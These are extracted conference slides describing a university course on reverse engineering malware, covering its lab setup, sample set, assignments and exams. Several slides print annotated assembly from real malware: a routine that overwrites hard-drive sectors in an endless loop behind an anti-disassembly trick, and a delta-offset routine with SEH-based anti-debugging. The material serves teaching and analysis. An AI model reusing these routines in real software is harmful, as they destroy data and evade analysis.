<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>A Highly Immersive Approach to Teaching Reverse Engineering</p>
    <p>Golden G. Richard III, Ph.D. Professor</p>
    <p>Director, Greater New Orleans Center for Information Assurance (GNOCIA) Department of Computer Science</p>
    <p>University of New Orleans</p>
    <p>Co-founder, Digital Forensics Solutions, LLC</p>
    <p>golden@cs.uno.edu http://www.cs.uno.edu/~golden</p>
  </div>
  <div class="page">
    <p>What?</p>
    <p>A hands-on course in reverse engineering, focusing on malware</p>
    <p>Provide solid background in theory of reversing  Code generation  How tools work: e.g., disassemblers, debuggers  Anti-analysis and anti-debug strategies</p>
    <p>Interleaved with hard reversing / analysis projects  Not a collection of Powerpoint and toy examples  Not a general hacking course</p>
    <p>Not because I object (I dont)  Not enough time in one semester to cover any additional</p>
    <p>hacking topics  Goal: Students develop serious, usable reverse</p>
    <p>engineering skills in one semester</p>
  </div>
  <div class="page">
    <p>Why So Little RE in Academia?</p>
    <p>Because its hard for the instructor?  Perception that skills cant be developed in</p>
    <p>a single semester?</p>
    <p>The university wont allow it  Should we be doing this?  Lack of student interest?  Im here to discover the others</p>
  </div>
  <div class="page">
    <p>Aside: Building Trust</p>
    <p>I personally have no problems getting courses like this approved</p>
    <p>I seriously lay down the law concerning what will happen to:  Classes like this being offered  Access to all the cool toys, HW, and SW in my security</p>
    <p>lab  should things go horribly wrong  Historically, despite teaching very hands-on courses in:</p>
    <p>OS internals  Digital forensics  Network security</p>
    <p>And despite having classes of students running around with root privileges on the machines in the lab</p>
  </div>
  <div class="page">
    <p>Aside: Building Trust (2)</p>
    <p>Nothing external and nothing significant has been destroyed</p>
    <p>Students understand network is monitored and impact of blowing something up outside my lab</p>
    <p>As a result, students are careful and self-policing  Ive been around for a long time and havent</p>
    <p>blown anything up</p>
    <p>Your mileage may vary</p>
  </div>
  <div class="page">
    <p>Why Do It?</p>
    <p>60%: RE is useful and should be taught  Great way to motivate students to dig deeper into</p>
    <p>systems  ASM skills, OS internals, Intel manuals as</p>
    <p>recreational reading  Computing != Computer + Java</p>
    <p>20%: Students begging  Resistance: I knew it would be a lot of work to do</p>
    <p>correctly, tho its been coming together for awhile</p>
    <p>20%: Im a hacker in professorial clothing  Good chance to do what I like</p>
  </div>
  <div class="page">
    <p>Who?</p>
    <p>Class taught in Spring 2009 for the first time  25 students, 2/3 graduate, 1/3 undergrad  ~20% had taken an OS internals course  100% had taken the Intro to Security course  ~50% had taken or were enrolled in a digital</p>
    <p>forensics course  Few had serious assembler skills  1 student had nearly expert RE skills  2-3 others had at least basic RE skills  The hardest course Ive ever had  1 student dropped in Spring 2009</p>
  </div>
  <div class="page">
    <p>Aside: ASM Courses: Dont Get Me Started</p>
    <p>Serious problem: Students have poor ASM skills  Dont know about yours, but our ASM course is</p>
    <p>(IMO) worthless  Didnt use to beI took that course in 1983!  Cant volunteer to teach that courseno time  No time to teach the ASM course inside RE  Solution:</p>
    <p>(Nearly) compassion-free immersion  ASM every day  Tight deadlines assignments requiring ASM</p>
    <p>comprehension</p>
  </div>
  <div class="page">
    <p>Topics  Goals of reverse engineering</p>
    <p>Software interoperability, patch verification, malware analysis, cracking</p>
    <p>Ethics and legal issues  DMCA, EULAs, RE == jail, seek ye lawyers</p>
    <p>Techniques / Tools for RE  Static vs. dynamic analysis, disassemblers, debuggers, live</p>
    <p>forensics tools, memory dumpers, packing / unpacking,   Malware background</p>
    <p>Types, propagation strategies, payload delivery, poly- and metamorphic malware,</p>
    <p>Basic Intel assembler (a few lectures, then on the job)  Registers, flags, common instructions, data formats, 32 vs. 64bit</p>
    <p>code, hardware components, paging, debugging architecture, examples</p>
  </div>
  <div class="page">
    <p>Topics (2)</p>
    <p>Windows Portable Executable (PE) format  C control structure, function, array, struct/union</p>
    <p>patterns generated by common compilers  Common malware functionality</p>
    <p>Delta offset calculation, API address discovery, infection and propagation,</p>
    <p>Anti-debugging / anti-VM functionality  Dynamic jumps, instruction prefetch attacks, LDT/</p>
    <p>GDT/IDT location analysis, use of debugging facilities  Packing and unpacking techniques</p>
    <p>Hand-rolled, UPX, Armadillo,</p>
  </div>
  <div class="page">
    <p>Laboratory Setup</p>
    <p>Isolated gigabit network with fast, private fileserver (16 x 15K SAS drives)  has to serve VMWare images</p>
    <p>Workstations running Linux + VMWare  User accounts including XP VMWare image stored by</p>
    <p>file server  XP image contains:</p>
    <p>sysinternals suite  Visual C++ Express Edition  MASM32  ollydbg  IDA Pro 5.x + x86emu plugin for x86 emulation  HBGary Responder (thanks, Penny!)  FACE, Volatools, ptfinder,</p>
    <p>Networking OFF in VMWare image whenever possible</p>
  </div>
  <div class="page">
    <p>Approach: Challenges</p>
    <p>Time is short!  ASM skills  Flipping Powerpoint guaranteed to fail  Want actual, rather than theoretical, skills to</p>
    <p>emerge</p>
    <p>Skills at end of semester should be (almost?) sufficient to analyze modern malware</p>
    <p>Must hurt students (a lot) to achieve skill levels without completely discouraging them</p>
  </div>
  <div class="page"/>
  <div class="page">
    <p>Approach: Malware Sampler</p>
    <p>Requirements:  Students start RE immediately  With each new malware sample, push students</p>
    <p>almost to breaking point  but not quite</p>
    <p>Michelangelo  DOS-7  SQL Slammer  Murkry  Lucius  Harulf  Conficker</p>
    <p>These were interleaved with short malware samples (that I wrote) to introduce:  Registry hacking  Replacement of system binaries  Addition of user accounts</p>
  </div>
  <div class="page">
    <p>Approach: Workflow</p>
    <p>Traditional lectures w/ Powerpoint for</p>
    <p>necessary background</p>
    <p>Documented ASM walkthroughs on document</p>
    <p>camera: new malware</p>
    <p>Midterm / Final: 60% reverse engineering assignments</p>
    <p>Reversing assignments of increasing difficulty,</p>
    <p>in teams of 2-3</p>
    <p>Lab sessions in lieu of lecture</p>
    <p>to introduce use of tools or concepts</p>
    <p>such as unpacking</p>
    <p>Documented ASM walkthroughs on document</p>
    <p>camera: team assignments</p>
  </div>
  <div class="page">
    <p>Approach: Assignments</p>
    <p>Series of team-based malware analyses  Goal is to produce fully documented disassemblies  Initially, uncommented but correct disassemblies  Later, only a binary malware sample</p>
    <p>Must coax tools to generate correct disassembly  Deal with packing, anti-analysis techniques</p>
    <p>Modest expectations initially, increase sharply as the semester progresses</p>
    <p>In some cases:  Solutions accepted and signed  Necessary concepts for complete solution discussed in class  Solution returned and then may be resubmitted</p>
    <p>Always let students try (and potentially fail) before giving away the solution</p>
  </div>
  <div class="page">
    <p>NukeHD: sub cx,cx</p>
    <p>NukeDism: inc cx push cs pop es mov ax,FE05h jmp $-2 sub ax,E702h mov bh,1 mov dx,80h int 13h jmp short NukeDism</p>
  </div>
  <div class="page">
    <p>NukeHD: sub cx,cx ; cx == sector number &lt;-- 0 ; FALL THROUGH...</p>
    <p>NukeDism: inc cx ; target next sector push cs ; pop es ; es &lt;-- cs mov ax,FE05h ; ax &lt;-- FE05h jmp $-2 ; jumps into middle of last instruction ; last instruction disassembled = ; B8 05 FE EB FC ; ; JMP targets 05 byte which is the ; opcode for a 16-bit immediate add ; to AX, thus ax &lt;-- ax + EBFEh ; ; the remaining byte, FC, is the ; opcode for the single byte instruction ; CLD (clear direction flag) ; sub ax,E702h ; ax &lt;-- ax - 0E702h = 301h mov bh,1 ; mov dx,80h ; first hard drive int 13h ; write 1 sector to hard drive jmp short NukeDism ; write &quot;forever&quot;</p>
  </div>
  <div class="page">
    <p>Approach: Exams</p>
    <p>30%: Abstract scenarios / Book material  You discover that a binary is packed with UPX. To</p>
    <p>discover the original entry point (OEP), you  A malware sample makes heavy use of dynamic</p>
    <p>JMPs. Which disassembler design is more likely to encounter problems? Why? Solutions?</p>
    <p>70%: References to RE exercises  Precise, detailed answers required  Hard to answer within available time if student didnt</p>
    <p>participate in the team-based analyses  When you analyzed the following section of Harulf,</p>
    <p>what did you discover? Comment each line.  Example follows on next slide</p>
  </div>
  <div class="page">
    <p>Start: jmp stuck sig_1 dd 0 sig_2 dd 0</p>
    <p>stuck: call here</p>
    <p>jmp getdelta here:</p>
    <p>assume fs:nothing mov eax,[esp] push eax push fs:[0] mov fs:[0],esp xor eax,eax mov eax,[eax] ret</p>
    <p>getdelta: ... pop fs:[0] pop edx pop ebp sub ebp,offset here add ebp,2h cmp ebp,0 je skipdecrypt</p>
  </div>
  <div class="page">
    <p>Start: jmp stuck sig_1 dd 0 sig_2 dd 0</p>
    <p>stuck: call here ; start delta offset calculation, ; trip up debuggers with stack-based SEH jmp getdelta ; this will be new SEH</p>
    <p>here: assume fs:nothing mov eax,[esp] ; address of jmp getdelta in eax push eax ; save address on stack (new SEH) push fs:[0] ; save old SEH head mov fs:[0],esp ; jmp getdelta is new SEH xor eax,eax ; zero eax mov eax,[eax] ; null ptr reference, invokes SEH ret</p>
    <p>getdelta: ... pop fs:[0] ; restore SEH pop edx ; pop ebp ; address of getdelta sub ebp,offset here ; subtract compile-time offset of here add ebp,2h ; jmp getdelta is two bytes cmp ebp,0 ; are we at entry point? je skipdecrypt ; yes, no need to decrypt body</p>
  </div>
  <div class="page">
    <p>Final Thoughts</p>
    <p>Its fun  Its hard (for you and for students)  Lots of initial student interest, interest sustained  Student feedback was overwhelmingly positive  Great way to generate students with sufficient</p>
    <p>background in systems to do real research  Potential benefit to students is high  In many cases, job interviews are won with a</p>
    <p>single data pointthis course provides many  RE will be offered regularly at UNO</p>
  </div>
  <div class="page">
    <p>Thanks.</p>
    <p>? golden@cs.uno.edu</p>
    <p>golden@digitalforensicssolutions.com</p>
  </div>
</Presentation>
